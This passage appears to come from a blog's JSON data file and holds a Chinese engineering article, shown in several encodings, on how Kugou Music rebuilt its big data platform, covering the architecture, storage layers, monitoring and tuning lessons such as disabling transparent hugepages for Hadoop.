洗后的数据重新写入Kafka并保留一定周期，离线计算(批处理)通过KG-Camus拉到HDFS(通过作业调度系统配置相应的作业计划)，实时计算基于Storm/JStorm直接从Kafka消费，有很完美的解决方案storm-kafka组件。\n\n离线计算(批处理)：通过spark，spark SQL实现，整体性能比hive提高5—10倍，hive脚本都在转换为Spark/Spark SQL;部分复杂的作业还是通过Hive/Spark的方式实现。在离线计算中大部分公司都会涉及到数据仓库的问题，酷狗音乐也不例外，也有数据仓库的概念，只是我们在做存储分层设计时弱化了数据仓库概念。数据存储分层模型如下图：\n\n![数据存储分层](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/7.jpg)\n\n大数据平台数据存储模型分为：数据缓冲层Data Cache Layer(DCL)、数据明细层Data Detail Layer(DDL)、公共数据层(Common)、数据汇总层Data Summary Layer(DSL)、数据应用层Data Application Layer(DAL)、数据分析层(Analysis)、临时提数层(Temp)。\n数据缓冲层(DCL)：存储业务系统或者客户端上报的，经过解码、清洗、转换后的原始数据，为数据过滤做准备。\n\n数据明细层(DDL)：存储接口缓冲层数据经过过滤后的明细数据。\n\n公共数据层(Common)：主要存储维表数据与外部业务系统数据。\n\n数据汇总层(DSL)：存储对明细数据，按业务主题，与公共数据层数据进行管理后的用户行为主题数据、用户行为宽表数据、轻量汇总数据等。为数据应用层统计计算提供基础数据。数据汇总层的数据永久保存在集群中。\n\n数据应用层(DAL)：存储运营分析(Operations Analysis )、指标体系(Metrics System)、线上服务(Online Service)与用户分析(User Analysis)等。需要对外输出的数据都存储在这一层。主要基于热数据部分对外提供服务，通过一定周期的数据还需要到DSL层装载查询。\n\n数据分析层(Analysis)：存储对数据明细层、公共数据层、数据汇总层关联后经过算法计算的、为推荐、广告、榜单等数据挖掘需求提供中间结果的数据。\n\n临时提数层(Temp)：存储临时提数、数据质量校验等生产的临时数据。\n\n实时计算：基于Storm/JStorm，Drools,Esper。主要应用于实时监控系统、APM、数据实时清洗平台、实时DAU统计等。\n\nHBase/MySQL：用于实时计算，离线计算结果存储服务。\n\nRedis：用于中间计算结果存储或字典数据等。\n\nElasticsearch：用于明细数据实时查询及HBase的二级索引存储(这块目前在数据中心还没有大规模使用，有兴趣的同学可以加入我们一起玩ES)。\n\nDruid：目前用于支持大数据集的快速即席查询(ad-hoc)。\n\n数据平台监控系统：数据平台监控系统包括基础平台监控系统与数据质量监控系统，数据平台监控系统分为2大方向，宏观层面和微观层面。宏观角度的理解就是进程级别,拓扑结构级别,拿Hadoop举例，如：DataNode，NameNode，JournalNode，ResourceManager，NodeManager，主要就是这5大组件，通过分析这些节点上的监控数据，一般你能够定位到慢节点，可能某台机器的网络出问题了，或者说某台机器执行的时间总是大于正常机器等等这样类似的问题。刚刚说的另一个监控方向，就是微观层面，就是细粒度化的监控，基于user用户级别，基于单个job，单个task级别的监控，像这类监控指标就是另一大方向，这类的监控指标在实际的使用场景中特别重要，一旦你的集群资源是开放给外面的用户使用，用户本身不了解你的这套机制原理，很容易会乱申请资源，造成严重拖垮集群整体运作效率的事情，所以这类监控的指标就是为了防止这样的事情发生。目前我们主要实现了宏观层面的监控。如：数据质量监控系统实现方案如下:\n\n![数据平台监控](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/8.jpg)\n\n## 三、大数据平台重构过程中踩过的坑\n\n我们在大数据平台重构过程中踩过的坑，大致可以分为操作系统、架构设计、开源组件三类，下面主要列举些比较典型的，花时间比较长的问题。\n\n### 1. 操作系统级的坑\n\nHadoop的I/O性能很大程度上依赖于Linux本地文件系统的读写性能。Linux中有多种文件系统可供选择，比如ext3和ext4，不同的文件系统性能有一定的差别。我们主要想利用ext4文件系统的特性，由于之前的操作系统都是CentOS5.9不支持ext4文件格式，所以考虑操作系统升级为CentOS6.3版本，部署Hadoop集群后，作业一启动，就出现CPU内核过高的问题。如下图：\n\n![hodoop集群，CPU过高](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/9.jpg)\n\n经过很长时间的测试验证，发现CentOS6优化了内存申请的效率，引入了THP的特性，而Hadoop是高密集型内存运算系统，这个改动给hadoop带来了副作用。通过以下内核参数优化关闭系统THP特性，CPU内核使用率马上下降，如下图:\necho never > /sys/kernel/mm/redhat_transparent_hugepage/enabled\necho never > /sys/kernel/mm/redhat_transparent_hugepage/defrag\n\n![THP的好处](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/10.jpg)\n\n### 2.架构设计的坑\n最初的数据流架构是数据采集网关把数据上报给Kafka，再由数据实时清洗平台(ETL)做预处理后直接实时写入HDFS，如下图：\n\n![HDFS](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/11.jpg)\n\n此架构，需要维持HDFS Client的长连接，由于网络等各种原因导致Storm实时写入HDFS经常不稳定，隔三差五的出现数据异常，使后面的计算结果异常不断，当时尝试过很多种手段去优化，如：保证长连接、连接断后重试机制、调整HDFS服务端参数等，都解决的不是彻底。\n每天异常不断，旧异常没解决，新异常又来了，在压力山大的情况下，考虑从架构角度调整，不能只从具体的技术点去优化了，在做架构调整时，考虑到我们架构重构的初衷，提高数据的实时性，尽量让计算任务实时化，但重构过程中要考虑现有业务的过渡，所以架构必须支持实时与离线的需求，结合这些需求，在数据实时清洗平台(ETL)后加了一层数据缓存重用层(kafka)，也就是经过数据实时清洗平台后的数据还是写入kafka集群，由于kafka支持重复消费，所以同一份数据可以既满足实时计算也满足离线计算，从上面的整体技术架构也可以看出，如下图：\n\n![kafka](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/12.jpg)\n\nKG-Camus组件也是基于架构调整后，重新实现了一套离线消费Kafka集群数据的组件，此组件是参考LinkedIn的Camus实现的。此方式，使数据消费模式由原来的推方式改为拉模式了，不用维持HDFS Client的长连接等功能了，直接由作业调度系统每隔时间去拉一次数据，不同的业务可以设置不同的时间间隔，从此架构调整上线后，基本没有类似的异常出现了。\n这个坑，是我自己给自己挖的，导致我们的重构计划延期2个月，主要原因是由最初技术预研究测试不充分所导致。\n\n### 3.开源组件的坑\n\n由于整个数据平台涉及到的开源组件很多，踩过的坑也是十个手指数不过来。\n\n(1)、当我们的行为数据全量接入到Kafka集群(几百亿/天)，数据采集网卡出现大量连接超时现象，但万兆网卡进出流量使用率并不是很高，只有几百Mbit/s，经过大量的测试排查后，调整以下参数，就是顺利解决了此问题。调整参数后网卡流量如下图：\n\na)、num.network.threads(网络处理线程数)值应该比cpu数略大\nb)、num.io.threads(接收网络线程请求并处理线程数)值提高为cpu数两倍\n\n![连接超时](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/13.jpg)\n(2)、在hive0.14 版本中，利用函数ROW_NUMBER OVER对数据进行数据处理后，导致大量的作业出现延时很大的现象，经异常排查后，发现在数据记录数没变的情况，数据的存储容量扩大到原来的5倍左右，导致MapReduce执行很慢造成的。改为自己实现类似的函数后，解决了容量扩大为原来几倍的现象。说到这里，也在此请教读到此处的读者一个问题，在海量数据去重中采用什么算法或组件进行比较合适，既能高性能又能高准确性，有好的建议或解决方案可以加happyjim2010微信私我。\n\n(3)、在业务实时监控系统中，用OpenTSDB与实时计算系统(storm)结合，用于聚合并存储实时metric数据。在这种实现中，通常需要在实时计算部分使用一个时间窗口(window)，用于聚合实时数据，然后将聚合结果写入tsdb。但是，由于在实际情况中，实时数据在采集、上报阶段可能会存在延时，而导致tsdb写入的数据不准确。针对这个问题，我们做了一个改进，在原有tsdb写入api的基础上，增加了一个原子加的api。这样，延迟到来的数据会被叠加到之前写入的数据之上，实时的准确性由于不可避免的原因(采集、上报阶段)产生了延迟，到最终的准确性也可以得到保证。另外，添加了这个改进之后，实时计算端的时间窗口就不需要因为考虑延迟问题设置得比较大，这样既节省了内存的消耗，也提高了实时性。\n\n## 四、后续持续改进\n\n数据存储(分布式内存文件系统(Tachyon)、数据多介质分层存储、数据列式存储)、即席查询(OLAP)、资源隔离、数据安全、平台微观层面监控、数据对外服务等。\n\n作者介绍：王劲：目前就职酷狗音乐，大数据架构师，负责酷狗大数据技术规划、建设、应用。 11年的IT从业经验，2年分布式应用开发，3年大数据技术实践经验，主要研究方向流式计算、大数据存储计算、分布式存储系统、NoSQL、搜索引擎等。","source":"_posts/酷狗音乐的大数据平台重构.md","raw":"---\ntitle: 酷狗音乐的大数据平台重构\ncategories:\n  - 我的收藏\ntags:\n  - 大数据\n  - hadoop\ndate: 2016-6-29 21:18:00\ntoc: false\n---\n\n> 本文是酷狗音乐的架构师王劲对酷狗大数据架构重构的总结。酷狗音乐的大数据架构本身很经典，而这篇讲解了对原来的架构上进行重构的工作内容，总共分为**重构的原因、新一代的大数据技术架构、踩过的坑、后续持续改进**四个部分来给大家谈酷狗音乐大数据平台重构的过程。\n\n眨眼就是新的一年了，时间过的真快，趁这段时间一直在写总结的机会，也总结下上一年的工作经验，避免重复踩坑。酷狗音乐大数据平台重构整整经历了一年时间，大头的行为流水数据迁移到新平台稳定运行，在这过程中填过坑，挖过坑，为后续业务的实时计算需求打下了很好的基础。在此感谢酷狗团队成员的不懈努力，大部分从开始只知道大数据这个概念，到现在成为团队的技术支柱，感到很欣慰。\n\n从重构原因，技术架构，踩过的坑，后续持续改进四个方面来描述酷狗音乐大数据平台重构的过程，在此抛砖引玉，这次的内容与6月份在高可用架构群分享的大数据技术实践的有点不同，技术架构做了些调整。\n\n其实大数据平台是一个庞大的系统工程，整个建设周期很长，涉及的生态链很长(包括：数据采集、接入，清洗、存储计算、数据挖掘，可视化等环节，每个环节都当做一个复杂的系统来建设)，风险也很大。\n<!-- more -->\n## 一、重构原因\n\n在讲重构原因前，先介绍下原有的大数据平台架构，如下图：\n![大数据平台架构](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/1.jpg)\n\n从上图可知，主要基于Hadoop1.x+hive做离线计算(T+1)，基于大数据平台的数据采集、数据接入、数据清洗、作业调度、平台监控几个环节存在的一些问题来列举下。\n\n### 数据采集：\n\n1、数据收集接口众多，且数据格式混乱，基本每个业务都有自己的上报接口\n2、存在较大的重复开发成本\n3、不能汇总上报，消耗客户端资源，以及网络流量\n4、每个接口收集数据项和格式不统一，加大后期数据统计分析难度\n5、各个接口实现质量并不高，存在被刷，泄密等风险\n\n### 数据接入:\n\n1、通过rsync同步文件，很难满足实时流计算的需求\n2、接入数据出现异常后，很难排查及定位问题，需要很高的人力成本排查\n3、业务系统数据通过Kettle每天全量同步到数据中心，同步时间长，导致依赖的作业经常会有延时现象\n\n### 数据清洗：\n\n1、ETL集中在作业计算前进行处理\n2、存在重复清洗\n\n### 作业调度：\n\n1、大部分作业通过crontab调度，作业多了后不利于管理\n2、经常出现作业调度冲突\n\n### 平台监控：\n\n1、只有硬件与操作系统级监控\n2、数据平台方面的监控等于空白\n\n基于以上问题，结合在大数据中，数据的时效性越高，数据越有价值(如：实时个性化推荐系统，RTB系统，实时预警系统等)的理念，因此，开始大重构数据平台架构。\n\n## 二、新一代大数据技术架构\n\n在讲新一代大数据技术架构前，先讲下大数据特征与大数据技术要解决的问题。\n\n**1.大数据特征**：“大量化(Volume)、多样化(Variety)、快速化(Velocity)、价值密度低(Value)”就是“大数据”显著的4V特征，或者说，只有具备这些特点的数据，才是大数据。\n\n![大数据特征](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/2.jpg)\n\n**2.大数据技术要解决的问题**：大数据技术被设计用于在成本可承受的条件下，通过非常快速(velocity)地采集、发现和分析，从大量(volumes)、多类别(variety)的数据中提取价值(value)，将是IT领域新一代的技术与架构。\n![需要解决的问题](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/3.jpg)\n\n介绍了大数据的特性及大数据技术要解决的问题，我们先看看新一代大数据技术架构的数据流架构图：\n\n![数据流架构](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/4.jpg)\n\n从这张图中，可以了解到大数据处理过程可以分为数据源、数据接入、数据清洗、数据缓存、存储计算、数据服务、数据消费等环节，每个环节都有具有高可用性、可扩展性等特性，都为下一个节点更好的服务打下基础。整个数据流过程都被数据质量监控系统监控，数据异常自动预警、告警。\n新一代大数据整体技术架构如图：\n\n![大数据技术架构](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/5.jpg)\n\n将大数据计算分为实时计算与离线计算，在整个集群中，奔着能实时计算的，一定走实时计算流处理，通过实时计算流来提高数据的时效性及数据价值，同时减轻集群的资源使用率集中现象。\n\n### 整体架构从下往上解释下每层的作用：\n\n#### 数据实时采集：\n\n主要用于数据源采集服务，从数据流架构图中，可以知道，数据源分为前端日志，服务端日志，业务系统数据。下面讲解数据是怎么采集接入的。\n\n**a.前端日志采集接入**：\n\n前端日志采集要求实时，可靠性，高可用性等特性。技术选型时，对开源的数据采集工具flume,scribe,chukwa测试对比，发现基本满足不了我们的业务场景需求。所以，选择基于kafka开发一套数据采集网关，来完成数据采集需求。数据采集网关的开发过程中走了一些弯路，最后采用nginx+lua开发，基于lua实现了kafka生产者协议。有兴趣同学可以去Github上看看，另一同事实现的，现在在github上比较活跃，被一些互联网公司应用于线上环境了。\n\n**b.后端日志采集接入**：\n\nFileCollect,考虑到很多线上环境的环境变量不能改动，为减少侵入式，目前是采用Go语言实现文件采集，年后也准备重构这块。\n\n前端，服务端的数据采集整体架构如下图：\n\n![数据采集架构](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/6.jpg)\n\n**c.业务数据接入**\n\n利用Canal通过MySQL的binlog机制实时同步业务增量数据。\n\n数据统一接入：为了后面数据流环节的处理规范，所有的数据接入数据中心，必须通过数据采集网关转换统一上报给Kafka集群，避免后端多种接入方式的处理问题。\n\n数据实时清洗(ETL)：为了减轻存储计算集群的资源压力及数据可重用性角度考虑，把数据解压、解密、转义，部分简单的补全，异常数据处理等工作前移到数据流中处理，为后面环节的数据重用打下扎实的基础(实时计算与离线计算)。\n\n数据缓存重用：为了避免大量数据流(400+亿条/天)写入HDFS，导致HDFS客户端不稳定现象及数据实时性考虑，把经过数据实时清洗后的数据重新写入Kafka并保留一定周期，离线计算(批处理)通过KG-Camus拉到HDFS(通过作业调度系统配置相应的作业计划)，实时计算基于Storm/JStorm直接从Kafka消费，有很完美的解决方案storm-kafka组件。\n\n离线计算(批处理)：通过spark，spark SQL实现，整体性能比hive提高5—10倍，hive脚本都在转换为Spark/Spark SQL;部分复杂的作业还是通过Hive/Spark的方式实现。在离线计算中大部分公司都会涉及到数据仓库的问题，酷狗音乐也不例外，也有数据仓库的概念，只是我们在做存储分层设计时弱化了数据仓库概念。数据存储分层模型如下图：\n\n![数据存储分层](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/7.jpg)\n\n大数据平台数据存储模型分为：数据缓冲层Data Cache Layer(DCL)、数据明细层Data Detail Layer(DDL)、公共数据层(Common)、数据汇总层Data Summary Layer(DSL)、数据应用层Data Application Layer(DAL)、数据分析层(Analysis)、临时提数层(Temp)。\n数据缓冲层(DCL)：存储业务系统或者客户端上报的，经过解码、清洗、转换后的原始数据，为数据过滤做准备。\n\n数据明细层(DDL)：存储接口缓冲层数据经过过滤后的明细数据。\n\n公共数据层(Common)：主要存储维表数据与外部业务系统数据。\n\n数据汇总层(DSL)：存储对明细数据，按业务主题，与公共数据层数据进行管理后的用户行为主题数据、用户行为宽表数据、轻量汇总数据等。为数据应用层统计计算提供基础数据。数据汇总层的数据永久保存在集群中。\n\n数据应用层(DAL)：存储运营分析(Operations Analysis )、指标体系(Metrics System)、线上服务(Online Service)与用户分析(User Analysis)等。需要对外输出的数据都存储在这一层。主要基于热数据部分对外提供服务，通过一定周期的数据还需要到DSL层装载查询。\n\n数据分析层(Analysis)：存储对数据明细层、公共数据层、数据汇总层关联后经过算法计算的、为推荐、广告、榜单等数据挖掘需求提供中间结果的数据。\n\n临时提数层(Temp)：存储临时提数、数据质量校验等生产的临时数据。\n\n实时计算：基于Storm/JStorm，Drools,Esper。主要应用于实时监控系统、APM、数据实时清洗平台、实时DAU统计等。\n\nHBase/MySQL：用于实时计算，离线计算结果存储服务。\n\nRedis：用于中间计算结果存储或字典数据等。\n\nElasticsearch：用于明细数据实时查询及HBase的二级索引存储(这块目前在数据中心还没有大规模使用，有兴趣的同学可以加入我们一起玩ES)。\n\nDruid：目前用于支持大数据集的快速即席查询(ad-hoc)。\n\n数据平台监控系统：数据平台监控系统包括基础平台监控系统与数据质量监控系统，数据平台监控系统分为2大方向，宏观层面和微观层面。宏观角度的理解就是进程级别,拓扑结构级别,拿Hadoop举例，如：DataNode，NameNode，JournalNode，ResourceManager，NodeManager，主要就是这5大组件，通过分析这些节点上的监控数据，一般你能够定位到慢节点，可能某台机器的网络出问题了，或者说某台机器执行的时间总是大于正常机器等等这样类似的问题。刚刚说的另一个监控方向，就是微观层面，就是细粒度化的监控，基于user用户级别，基于单个job，单个task级别的监控，像这类监控指标就是另一大方向，这类的监控指标在实际的使用场景中特别重要，一旦你的集群资源是开放给外面的用户使用，用户本身不了解你的这套机制原理，很容易会乱申请资源，造成严重拖垮集群整体运作效率的事情，所以这类监控的指标就是为了防止这样的事情发生。目前我们主要实现了宏观层面的监控。如：数据质量监控系统实现方案如下:\n\n![数据平台监控](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/8.jpg)\n\n## 三、大数据平台重构过程中踩过的坑\n\n我们在大数据平台重构过程中踩过的坑，大致可以分为操作系统、架构设计、开源组件三类，下面主要列举些比较典型的，花时间比较长的问题。\n\n### 1. 操作系统级的坑\n\nHadoop的I/O性能很大程度上依赖于Linux本地文件系统的读写性能。Linux中有多种文件系统可供选择，比如ext3和ext4，不同的文件系统性能有一定的差别。我们主要想利用ext4文件系统的特性，由于之前的操作系统都是CentOS5.9不支持ext4文件格式，所以考虑操作系统升级为CentOS6.3版本，部署Hadoop集群后，作业一启动，就出现CPU内核过高的问题。如下图：\n\n![hodoop集群，CPU过高](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/9.jpg)\n\n经过很长时间的测试验证，发现CentOS6优化了内存申请的效率，引入了THP的特性，而Hadoop是高密集型内存运算系统，这个改动给hadoop带来了副作用。通过以下内核参数优化关闭系统THP特性，CPU内核使用率马上下降，如下图:\necho never > /sys/kernel/mm/redhat_transparent_hugepage/enabled\necho never > /sys/kernel/mm/redhat_transparent_hugepage/defrag\n\n![THP的好处](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/10.jpg)\n\n### 2.架构设计的坑\n最初的数据流架构是数据采集网关把数据上报给Kafka，再由数据实时清洗平台(ETL)做预处理后直接实时写入HDFS，如下图：\n\n![HDFS](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/11.jpg)\n\n此架构，需要维持HDFS Client的长连接，由于网络等各种原因导致Storm实时写入HDFS经常不稳定，隔三差五的出现数据异常，使后面的计算结果异常不断，当时尝试过很多种手段去优化，如：保证长连接、连接断后重试机制、调整HDFS服务端参数等，都解决的不是彻底。\n每天异常不断，旧异常没解决，新异常又来了，在压力山大的情况下，考虑从架构角度调整，不能只从具体的技术点去优化了，在做架构调整时，考虑到我们架构重构的初衷，提高数据的实时性，尽量让计算任务实时化，但重构过程中要考虑现有业务的过渡，所以架构必须支持实时与离线的需求，结合这些需求，在数据实时清洗平台(ETL)后加了一层数据缓存重用层(kafka)，也就是经过数据实时清洗平台后的数据还是写入kafka集群，由于kafka支持重复消费，所以同一份数据可以既满足实时计算也满足离线计算，从上面的整体技术架构也可以看出，如下图：\n\n![kafka](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/12.jpg)\n\nKG-Camus组件也是基于架构调整后，重新实现了一套离线消费Kafka集群数据的组件，此组件是参考LinkedIn的Camus实现的。此方式，使数据消费模式由原来的推方式改为拉模式了，不用维持HDFS Client的长连接等功能了，直接由作业调度系统每隔时间去拉一次数据，不同的业务可以设置不同的时间间隔，从此架构调整上线后，基本没有类似的异常出现了。\n这个坑，是我自己给自己挖的，导致我们的重构计划延期2个月，主要原因是由最初技术预研究测试不充分所导致。\n\n### 3.开源组件的坑\n\n由于整个数据平台涉及到的开源组件很多，踩过的坑也是十个手指数不过来。\n\n(1)、当我们的行为数据全量接入到Kafka集群(几百亿/天)，数据采集网卡出现大量连接超时现象，但万兆网卡进出流量使用率并不是很高，只有几百Mbit/s，经过大量的测试排查后，调整以下参数，就是顺利解决了此问题。调整参数后网卡流量如下图：\n\na)、num.network.threads(网络处理线程数)值应该比cpu数略大\nb)、num.io.threads(接收网络线程请求并处理线程数)值提高为cpu数两倍\n\n![连接超时](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/13.jpg)\n(2)、在hive0.14 版本中，利用函数ROW_NUMBER OVER对数据进行数据处理后，导致大量的作业出现延时很大的现象，经异常排查后，发现在数据记录数没变的情况，数据的存储容量扩大到原来的5倍左右，导致MapReduce执行很慢造成的。改为自己实现类似的函数后，解决了容量扩大为原来几倍的现象。说到这里，也在此请教读到此处的读者一个问题，在海量数据去重中采用什么算法或组件进行比较合适，既能高性能又能高准确性，有好的建议或解决方案可以加happyjim2010微信私我。\n\n(3)、在业务实时监控系统中，用OpenTSDB与实时计算系统(storm)结合，用于聚合并存储实时metric数据。在这种实现中，通常需要在实时计算部分使用一个时间窗口(window)，用于聚合实时数据，然后将聚合结果写入tsdb。但是，由于在实际情况中，实时数据在采集、上报阶段可能会存在延时，而导致tsdb写入的数据不准确。针对这个问题，我们做了一个改进，在原有tsdb写入api的基础上，增加了一个原子加的api。这样，延迟到来的数据会被叠加到之前写入的数据之上，实时的准确性由于不可避免的原因(采集、上报阶段)产生了延迟，到最终的准确性也可以得到保证。另外，添加了这个改进之后，实时计算端的时间窗口就不需要因为考虑延迟问题设置得比较大，这样既节省了内存的消耗，也提高了实时性。\n\n## 四、后续持续改进\n\n数据存储(分布式内存文件系统(Tachyon)、数据多介质分层存储、数据列式存储)、即席查询(OLAP)、资源隔离、数据安全、平台微观层面监控、数据对外服务等。\n\n作者介绍：王劲：目前就职酷狗音乐，大数据架构师，负责酷狗大数据技术规划、建设、应用。 11年的IT从业经验，2年分布式应用开发，3年大数据技术实践经验，主要研究方向流式计算、大数据存储计算、分布式存储系统、NoSQL、搜索引擎等。","slug":"酷狗音乐的大数据平台重构","published":1,"updated":"2016-11-17T11:59:42.683Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulex0058gwtmdj9w5gko","content":"<blockquote>\n<p>&#x672C;&#x6587;&#x662F;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#x7684;&#x67B6;&#x6784;&#x5E08;&#x738B;&#x52B2;&#x5BF9;&#x9177;&#x72D7;&#x5927;&#x6570;&#x636E;&#x67B6;&#x6784;&#x91CD;&#x6784;&#x7684;&#x603B;&#x7ED3;&#x3002;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#x7684;&#x5927;&#x6570;&#x636E;&#x67B6;&#x6784;&#x672C;&#x8EAB;&#x5F88;&#x7ECF;&#x5178;&#xFF0C;&#x800C;&#x8FD9;&#x7BC7;&#x8BB2;&#x89E3;&#x4E86;&#x5BF9;&#x539F;&#x6765;&#x7684;&#x67B6;&#x6784;&#x4E0A;&#x8FDB;&#x884C;&#x91CD;&#x6784;&#x7684;&#x5DE5;&#x4F5C;&#x5185;&#x5BB9;&#xFF0C;&#x603B;&#x5171;&#x5206;&#x4E3A;<strong>&#x91CD;&#x6784;&#x7684;&#x539F;&#x56E0;&#x3001;&#x65B0;&#x4E00;&#x4EE3;&#x7684;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x67B6;&#x6784;&#x3001;&#x8E29;&#x8FC7;&#x7684;&#x5751;&#x3001;&#x540E;&#x7EED;&#x6301;&#x7EED;&#x6539;&#x8FDB;</strong>&#x56DB;&#x4E2A;&#x90E8;&#x5206;&#x6765;&#x7ED9;&#x5927;&#x5BB6;&#x8C08;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x91CD;&#x6784;&#x7684;&#x8FC7;&#x7A0B;&#x3002;</p>\n</blockquote>\n<p>&#x7728;&#x773C;&#x5C31;&#x662F;&#x65B0;&#x7684;&#x4E00;&#x5E74;&#x4E86;&#xFF0C;&#x65F6;&#x95F4;&#x8FC7;&#x7684;&#x771F;&#x5FEB;&#xFF0C;&#x8D81;&#x8FD9;&#x6BB5;&#x65F6;&#x95F4;&#x4E00;&#x76F4;&#x5728;&#x5199;&#x603B;&#x7ED3;&#x7684;&#x673A;&#x4F1A;&#xFF0C;&#x4E5F;&#x603B;&#x7ED3;&#x4E0B;&#x4E0A;&#x4E00;&#x5E74;&#x7684;&#x5DE5;&#x4F5C;&#x7ECF;&#x9A8C;&#xFF0C;&#x907F;&#x514D;&#x91CD;&#x590D;&#x8E29;&#x5751;&#x3002;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x91CD;&#x6784;&#x6574;&#x6574;&#x7ECF;&#x5386;&#x4E86;&#x4E00;&#x5E74;&#x65F6;&#x95F4;&#xFF0C;&#x5927;&#x5934;&#x7684;&#x884C;&#x4E3A;&#x6D41;&#x6C34;&#x6570;&#x636E;&#x8FC1;&#x79FB;&#x5230;&#x65B0;&#x5E73;&#x53F0;&#x7A33;&#x5B9A;&#x8FD0;&#x884C;&#xFF0C;&#x5728;&#x8FD9;&#x8FC7;&#x7A0B;&#x4E2D;&#x586B;&#x8FC7;&#x5751;&#xFF0C;&#x6316;&#x8FC7;&#x5751;&#xFF0C;&#x4E3A;&#x540E;&#x7EED;&#x4E1A;&#x52A1;&#x7684;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x9700;&#x6C42;&#x6253;&#x4E0B;&#x4E86;&#x5F88;&#x597D;&#x7684;&#x57FA;&#x7840;&#x3002;&#x5728;&#x6B64;&#x611F;&#x8C22;&#x9177;&#x72D7;&#x56E2;&#x961F;&#x6210;&#x5458;&#x7684;&#x4E0D;&#x61C8;&#x52AA;&#x529B;&#xFF0C;&#x5927;&#x90E8;&#x5206;&#x4ECE;&#x5F00;&#x